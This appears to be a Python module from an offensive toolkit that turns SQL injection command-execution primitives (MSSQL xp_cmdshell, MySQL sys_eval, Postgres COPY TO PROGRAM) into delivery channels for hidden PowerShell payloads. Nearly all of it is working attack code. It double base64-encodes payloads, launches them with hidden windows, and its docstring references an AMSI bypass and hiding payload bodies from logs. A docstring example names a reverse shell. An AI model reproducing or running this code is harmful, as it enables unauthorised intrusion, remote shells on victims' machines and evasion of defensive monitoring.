"""
RCE-to-payload bridge: deliver ps_payloads through SQLi-based RCE.

When sqli.py confirms an injection and enables a command-execution
primitive (MSSQL xp_cmdshell, MySQL sys_eval, Postgres COPY TO
PROGRAM), this module takes a ps_payloads one-liner and delivers
it through that primitive. The output comes back as a string and
is returned to the caller.

The bridge is dialect-aware:

  mssql     — xp_cmdshell 'powershell -enc <b64>'
              Output is captured via a temp table and extracted
              using the same extraction path sqli.py already uses.

  mysql     — SELECT sys_eval('powershell -enc <b64>')
              Output is returned directly by sys_eval.

  postgres  — COPY (SELECT '') TO PROGRAM 'powershell -enc <b64>'
              No stdout; we use OOB or return the exit code only.

The actual delivery is done by constructing a command string
that, when executed on the target, spawns PowerShell with an
-EncodedCommand argument containing the payload's base64 blob.
That means the payload is never passed as a literal string to
the shell — it's passed as a base64 argument to PowerShell,
which decodes and runs it.

Because the ps_payloads one-liner is itself a base64-wrapped
AMSI bypass + script, the overall nesting is:

  SQLi wrapper
    → shell command
      → powershell -enc
        → base64 decode
          → AMSI bypass assembly load
            → base64 decode
              → the actual payload script

Two layers of base64. This is deliberate: it keeps the shell
command line short (which matters for some injection contexts)
and it means the payload body never appears in the SQLi log or
in the shell command line in a readable form.
"""

import asyncio
import base64
import secrets

from core.output import info, success, warn, error

from vuln import ps_payloads


# =====================================================================
# Command construction
# =====================================================================

def _build_powershell_command(payload_one_liner: str) -> str:
    """Turn a ps_payloads one-liner into a `powershell -enc <b64>`
    command that will run on a Windows target.

    The outer command is short (well under 8000 chars for
    realistic payloads) and can be passed to xp_cmdshell or
    sys_eval without escaping problems beyond the usual single-
    quote doubling.
    """
    # Wrap the one-liner in a PowerShell -EncodedCommand. This
    # expects UTF-16LE base64.
    cmd = f'powershell -nop -w hidden -c "{payload_one_liner}"'
    encoded = base64.b64encode(cmd.encode("utf-16-le")).decode("ascii")
    return f"powershell -nop -w hidden -EncodedCommand {encoded}"


# =====================================================================
# MSSQL delivery
# =====================================================================

async def _deliver_mssql(session, point, limiter, jar,
                          payload_one_liner, extract_fn,
                          verbose=False):
    """Deliver via MSSQL xp_cmdshell.

    `extract_fn` is the closure from sqli.py's asset extraction that
    takes (sql_query, label) and returns a string.
    """
    from vuln import sqli

    cmd = _build_powershell_command(payload_one_liner)

    if verbose:
        info(f"  mssql: delivering {len(cmd)}-byte command via "
             f"xp_cmdshell")

    # Use sqli.py's existing xp_cmdshell runner. It handles the
    # temp table, INSERT EXEC, output extraction, and cleanup.
    try:
        output = await sqli._mssql_run_cmd(
            session, point, None, limiter, jar,
            cmd, extract_fn, verbose=verbose)
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "method": "mssql_xp_cmdshell",
            "error": f"{type(e).__name__}: {e}",
        }

    if output is None:
        return {
            "success": False,
            "output": "",
            "method": "mssql_xp_cmdshell",
            "error": "xp_cmdshell returned None",
        }

    return {
        "success": True,
        "output": output,
        "method": "mssql_xp_cmdshell",
        "error": None,
    }


# =====================================================================
# MySQL delivery
# =====================================================================

async def _deliver_mysql(session, point, limiter, jar,
                          payload_one_liner, extract_fn,
                          verbose=False):
    """Deliver via MySQL sys_eval UDF.

    Requires the MySQL UDF to already be installed (Session 3b
    handles that). If sys_eval isn't available, returns an error.
    """
    from vuln import sqli

    cmd = _build_powershell_command(payload_one_liner)
    d = sqli._dialect("mysql")
    cmd_esc = d["str_escape"](cmd)

    if verbose:
        info(f"  mysql: delivering {len(cmd)}-byte command via "
             f"sys_eval")

    expr = f"(SELECT sys_eval('{cmd_esc}'))"
    try:
        output = await extract_fn(expr, "payload output")
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "method": "mysql_sys_eval",
            "error": f"{type(e).__name__}: {e}",
        }

    if not output:
        return {
            "success": False,
            "output": "",
            "method": "mysql_sys_eval",
            "error": "sys_eval returned empty (UDF may not be installed)",
        }

    return {
        "success": True,
        "output": output,
        "method": "mysql_sys_eval",
        "error": None,
    }


# =====================================================================
# Postgres delivery
# =====================================================================

async def _deliver_postgres(session, point, limiter, jar,
                             payload_one_liner, extract_fn,
                             verbose=False):
    """Deliver via Postgres COPY TO PROGRAM.

    COPY TO PROGRAM doesn't capture stdout, so we can't see the
    payload's output directly. Options:
      - If the payload is OOB (calls back to a listener), we just
        fire it and wait for the callback.
      - Otherwise, we pipe output to a file and try to read it back
        via COPY FROM — this is fragile and often blocked.
      - Or we return success with an empty output.

    For now, this function fires the payload and returns success.
    The caller is expected to have OOB listening if they care about
    output.
    """
    from vuln import sqli

    cmd = _build_powershell_command(payload_one_liner)
    d = sqli._dialect("postgres")
    cmd_esc = d["str_escape"](cmd)

    if verbose:
        info(f"  postgres: delivering {len(cmd)}-byte command via "
             f"COPY TO PROGRAM")

    sql = f"; COPY (SELECT '') TO PROGRAM '{cmd_esc}'--"
    try:
        r = await sqli._send(
            session, point, limiter, jar,
            raw_payload=sql, verbose=verbose, dbms="postgres")
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "method": "postgres_copy_to_program",
            "error": f"{type(e).__name__}: {e}",
        }

    if r is None:
        return {
            "success": False,
            "output": "",
            "method": "postgres_copy_to_program",
            "error": "transport failure during COPY TO PROGRAM",
        }

    # COPY TO PROGRAM returns no stdout. We consider it successful
    # if the injection didn't error.
    body = r[2] or ""
    failure_markers = ("permission denied", "must be superuser",
                       "no such file", "could not open")
    for marker in failure_markers:
        if marker in body.lower():
            return {
                "success": False,
                "output": "",
                "method": "postgres_copy_to_program",
                "error": f"COPY TO PROGRAM failed: {marker}",
            }

    return {
        "success": True,
        "output": "(no stdout from COPY TO PROGRAM; if the payload "
                  "was OOB, check the listener)",
        "method": "postgres_copy_to_program",
        "error": None,
    }


# =====================================================================
# Public API
# =====================================================================

_DISPATCH = {
    "mssql":    _deliver_mssql,
    "mysql":    _deliver_mysql,
    "postgres": _deliver_postgres,
}


def _ensure_adaptive(limiter):
    """Accept either a raw RateLimiter or an AdaptiveLimiter.

    sqli.py's internals call limiter.base and limiter.observe(), which
    only exist on AdaptiveLimiter. Callers (toolkit.py, and any future
    module that reuses sqli's extraction internals directly) may hand
    us a raw RateLimiter instead. Wrap it once here; both wrapper and
    raw expose .wait(), so the AdaptiveLimiter construction is safe.
    """
    from vuln.sqli import AdaptiveLimiter
    if hasattr(limiter, "base"):
        return limiter
    return AdaptiveLimiter(limiter)


async def deliver_payload(session, point, limiter, dbms,
                           payload_result, extract_fn=None,
                           jar=None, verbose=False):
    """Deliver a ps_payloads dict through an RCE-capable SQLi.

    `payload_result` is a dict from ps_payloads (must contain
    "one_liner"). `extract_fn` is the closure from sqli.py's asset
    extraction — if None, one is created by re-running context and
    oracle detection.

    Returns {"success": bool, "output": str, "method": str, "error": str|None}.
    """
    limiter = _ensure_adaptive(limiter)

    if extract_fn is None:
        extract_fn = await _build_extract_fn(
            session, point, limiter, dbms, jar=jar, verbose=verbose)
        if extract_fn is None:
            return {
                "success": False,
                "output": "",
                "method": None,
                "error": "could not build extraction oracle",
            }

    one_liner = payload_result.get("one_liner") if isinstance(
        payload_result, dict) else None
    if not one_liner:
        return {
            "success": False,
            "output": "",
            "method": None,
            "error": "payload_result missing 'one_liner'",
        }

    deliver_fn = _DISPATCH.get(dbms)
    if deliver_fn is None:
        return {
            "success": False,
            "output": "",
            "method": None,
            "error": f"unsupported DBMS for delivery: {dbms!r}",
        }

    return await deliver_fn(
        session, point, limiter, jar,
        one_liner, extract_fn, verbose=verbose)


async def _build_extract_fn(session, point, limiter, dbms, jar=None,
                              verbose=False):
    """Standalone extract-fn constructor. Runs the same detect-*
    steps sqli.py uses, then returns a closure for use by the
    delivery functions."""
    from vuln import sqli

    limiter = _ensure_adaptive(limiter)

    # Context detection
    ctx_name, wrap, oracle_kind, oracle_state = await sqli.detect_context(
        session, point, limiter, dbms, jar=jar, verbose=verbose)
    if ctx_name is None:
        return None

    # Union detection
    base_r = await sqli._send(session, point, limiter, jar,
                               raw_payload=None, verbose=verbose)
    baseline_body = base_r[2] if base_r else ""

    n_cols, printable_idx = await sqli.detect_union(
        session, point, ctx_name, limiter, dbms, baseline_body,
        jar=jar, verbose=verbose)
    union_ok = n_cols is not None

    # Error oracle
    err_func = None
    if dbms in ("mysql", "mssql", "oracle"):
        err_func = await sqli.detect_error_oracle(
            session, point, wrap, limiter, dbms, jar=jar,
            verbose=verbose)

    async def extract(query, label):
        if union_ok:
            val = await sqli.union_extract(
                session, point, ctx_name, limiter, n_cols,
                printable_idx, query, dbms, jar=jar, label=label,
                verbose=verbose)
            if val and len(val) >= 2:
                return val
        if err_func:
            val = await sqli.error_extract(
                session, point, wrap, limiter, err_func, query,
                dbms, jar=jar, label=label, verbose=verbose)
            if val:
                return val
        return await sqli.extract_sql_data(
            session, point, wrap, limiter, oracle_kind,
            oracle_state, query, dbms, jar=jar, label=label,
            verbose=verbose)

    return extract


async def deliver_by_name(session, point, limiter, dbms,
                           payload_name, payload_params=None,
                           extract_fn=None, jar=None, verbose=False):
    """Convenience: build a ps_payloads payload by name and deliver it.

    `payload_params` is a dict passed to the payload function. For
    example, for reverse_shell: {"lhost": "10.0.0.5", "lport": 4444}.
    """
    payload_params = payload_params or {}

    # Resolve the payload
    fn = (ps_payloads.NOARG_PAYLOADS.get(payload_name)
          or ps_payloads.PARAM_PAYLOADS.get(payload_name))
    if fn is None:
        return {
            "success": False,
            "output": "",
            "method": None,
            "error": f"unknown payload: {payload_name!r}",
        }

    try:
        payload = fn(**payload_params)
    except TypeError as e:
        return {
            "success": False,
            "output": "",
            "method": None,
            "error": f"payload params error: {e}",
        }
    except Exception as e:
        return {
            "success": False,
            "output": "",
            "method": None,
            "error": f"payload build failed: {type(e).__name__}: {e}",
        }

    return await deliver_payload(
        session, point, limiter, dbms, payload,
        extract_fn=extract_fn, jar=jar, verbose=verbose)


# =====================================================================
# Human-readable summary
# =====================================================================

def format_result(result: dict) -> str:
    """Format a deliver_result for console output."""
    if result.get("success"):
        out = result.get("output") or ""
        if not out.strip():
            return f"  delivery succeeded via {result['method']} " \
                   f"(no output)"
        return f"  delivery succeeded via {result['method']}:\n" \
               f"{out}"
    return f"  delivery FAILED via {result.get('method') or '?'}: " \
           f"{result.get('error') or 'unknown error'}"